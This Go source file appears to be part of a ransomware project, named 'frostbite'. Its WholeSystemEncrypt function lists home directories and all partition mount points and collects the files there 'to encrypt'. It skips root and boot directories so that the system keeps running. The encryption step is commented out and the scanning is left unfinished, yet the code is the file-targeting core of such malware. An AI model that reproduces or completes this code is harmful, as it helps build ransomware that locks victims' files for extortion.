package system

import (
	"fmt"
	"os"
	"runtime"
	"sync"
	"time"

	scan "frostbite.com/tools/scan"
	humanize "github.com/dustin/go-humanize"

	"github.com/shirou/gopsutil/disk"
)

var pl = fmt.Println

// enc "frostbite.com/encryption"

func WholeSystemEncrypt() {

	//set variables
	var (
		filesToEncrypt   []string
		sizeOfFoundFiles int64
	)
	dirsToScan := []string{
		"/home",
		"C:\\Users",
	}
	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}

	timeNow := time.Now()
	//get all partitions
	//append all partition mount points to dirsToScan
	//remove dirs that would break the system or do not exist
	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
	pl("dirsToScan: ", dirsToScan)

	//add go routine for each dir
	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	wg := sync.WaitGroup{}
	wg.Add(len(dirsToScan))
	chanFile := make(chan []string)
	chanSize := make(chan int64)

	for _, dir := range dirsToScan {

		var dirsToScan []string
		//get first 2 levels of dirs
		//2d slice of strings
		type dirTree struct {
			level int
			path  string
		}
		var dirsInLevels []dirTree

		pl("dirsToScan: ", dirsToScan)
		pl("dirsInLevels: ", dirsInLevels)

		//TODO extract to "scanDirGoRoutine"
		// go scanDirGoRoutine(dir, &wg, chanFile, chanSize)

	}
	//wait for all go routines to finish
	//TODO extract to "WaitForScanDirGoRoutines"
	go func() {
		for {
			select {
			case files := <-chanFile:
				filesToEncrypt = append(filesToEncrypt, files...)
			case size := <-chanSize:
				sizeOfFoundFiles += size
			}
		}
	}()

	wg.Wait()
	close(chanFile)
	close(chanSize)

	timeEnd := time.Now()
	pl("TOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
	//print human readable size
	pl("TOTAL size of found files: ", humanize.Bytes(uint64(sizeOfFoundFiles)))
	pl("Time elapsed: ", timeEnd.Sub(timeNow))

}

func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []string {
	partitions, _ := disk.Partitions(false)

	for _, partition := range partitions {
		dirsToScan = append(dirsToScan, partition.Mountpoint)
	}

	dirsToScan = removeDirsFromList(dirsToRemove, dirsToScan)
	return dirsToScan
}

func scanDirGoRoutine(dir string, wg *sync.WaitGroup, chanFile chan []string, chanSize chan int64) {

	_, err := os.Stat(dir)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("Dir does not exist: ", dir)
		}
	} else {
		pl("Scanning: ", dir)
		files, size := scan.ScanNoSideEffects(dir, true)

		chanFile <- files
		chanSize <- size
		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
	}
	wg.Done()
}

func removeDirsFromList(dirsToRemove []string, dirsToScan []string) []string {
	//* Remove dirs that would break the system

	dirsToReturn := []string{}
	for _, dir := range dirsToScan {
		//check if dir exists and add it to dirsToReturn
		_, err := os.Stat(dir)
		if err == nil {
			dirsToReturn = append(dirsToReturn, dir)

		}

		for _, dirToRemove := range dirsToRemove {
			for i, dir := range dirsToReturn {
				if dir == dirToRemove {
					dirsToReturn = append(dirsToReturn[:i], dirsToReturn[i+1:]...)
				}
			}
		}
	}
	return dirsToReturn
}
